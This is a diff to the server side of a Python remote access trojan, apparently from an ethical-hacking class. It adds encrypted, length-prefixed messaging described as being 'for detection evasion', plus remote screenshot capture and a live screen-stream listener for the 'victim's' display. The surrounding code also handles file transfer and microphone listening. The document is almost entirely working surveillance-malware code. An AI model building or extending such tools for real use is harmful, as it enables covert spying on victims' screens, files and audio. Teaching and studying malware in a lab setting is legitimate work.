@@ -1,9 +1,11 @@
 ################################################
-# Authors: Korn D.,                            #
+# Authors: Korn D., Krittanut Y.,              #
 # Class: SIIT Ethical Hacking, 2023-2024       #
 ################################################
 
 # Import necessary libraries
+import base64
+import datetime  # For timestamping
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
@@ -12,6 +14,9 @@ from ctypes import c_char_p, c_int, CFUNCTYPE
 import pyaudio
 import threading
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
+import cv2 # (OpenCV) shows the image in a live window.
+import numpy as np # helps decode the raw JPEG bytes into an image array.
+import threading
 
 
 # Pre-shared key for encryption
@@ -22,22 +27,27 @@ cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
     jsondata = json.dumps(data)  # Convert data to JSON format
-    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data
-    target.send(encrypted_data)  # Send the encrypted data over the network
+    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
+    data_len = len(encrypted_data)
+    target.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
+    target.sendall(encrypted_data)
+
 
 
 # Function to receive data in a reliable way (expects JSON data)
 def reliable_recv():
-    data = b''  # Initialize an empty byte string to hold received data
-    while True:
-        try:
-            data += target.recv(1024)  # Receive data in chunks of 1024 bytes
-            if not data:
-                continue
-            decrypted_data = cipher.decrypt(data)  # Decrypt the received data *added*
-            return json.loads(decrypted_data.decode())  # Parse the received JSON data
-        except ValueError:
-            continue
+    data_len_bytes = target.recv(4)
+    if not data_len_bytes:
+        return None
+    data_len = int.from_bytes(data_len_bytes, 'big')
+    data = b''
+    while len(data) < data_len:
+        packet = target.recv(data_len - len(data))
+        if not packet:
+            return None
+        data += packet
+    decrypted_data = cipher.decrypt(data)
+    return json.loads(decrypted_data.decode())
 
 
 # Function to upload a file to the target machine
@@ -67,6 +77,38 @@ def download_file(file_name):
     target.settimeout(None)
     # Close the local file after downloading is complete.
     f.close()
+
+# Listens for incoming image data from the victim.
+def receive_screen_stream():
+    stream_sock = socket.socket() # Create a TCP socket
+    stream_sock.bind(('0.0.0.0', 9999)) # Bind it to port 9999, accept the victim’s stream connection
+    stream_sock.listen(1)
+    conn, addr = stream_sock.accept()
+    print(f"[+] Live screen stream from {addr}")
+
+    try:
+        while True: # Start reading frames in a loop.
+            size_data = conn.recv(4) # Read the 4-byte size prefix.
+            if not size_data:
+                break
+            size = int.from_bytes(size_data, 'big') # Convert it back into an integer (JPEG image length).
+            data = b''
+            while len(data) < size: # Read the full image payload based on the size prefix.
+                packet = conn.recv(size - len(data))
+                if not packet:
+                    break
+                data += packet # Append until the complete image is received.
+
+            img_array = np.frombuffer(data, dtype=np.uint8) # Convert raw JPEG bytes into a numpy array
+            frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR) # Decode into a color image (OpenCV format)
+            if frame is not None:
+                resized = cv2.resize(frame, (1280, 720))  # Change size of window
+                cv2.imshow("Live Screen", resized) # Display the image in a window named Live Screen
+                if cv2.waitKey(1) == ord('q'): # If the user presses q, stop the stream
+                    break
+    finally:
+        conn.close()
+        cv2.destroyAllWindows()
 
 
 ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
@@ -138,6 +180,24 @@ def target_communication():
             print(result)
         elif command == 'listening_stop':
             stream_flag['on'] = False
+        elif command == 'screenshot':
+            # If the user enters 'screenshot', send a command to take a screenshot on the target.
+            shot = reliable_recv()
+            image_data = base64.b64decode(shot)
+            if image_data:
+                # Format timestamp
+                timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+                filename = f'screenshot_{timestamp}.png' # filename format
+                with open(filename, 'wb') as f:
+                    f.write(image_data)
+                # If the screenshot command is successful, print the result.
+                print('[+] Screenshot taken successfully.')
+            else:
+                # If the screenshot command fails, print an error message.
+                print('[-] Failed to take screenshot.')
+        elif command == 'screen_stream':
+            threading.Thread(target=receive_screen_stream, daemon=True).start()
+            print('[*] Waiting for live stream...')  # target will send after this
             result = reliable_recv()
             print(result)
         else:
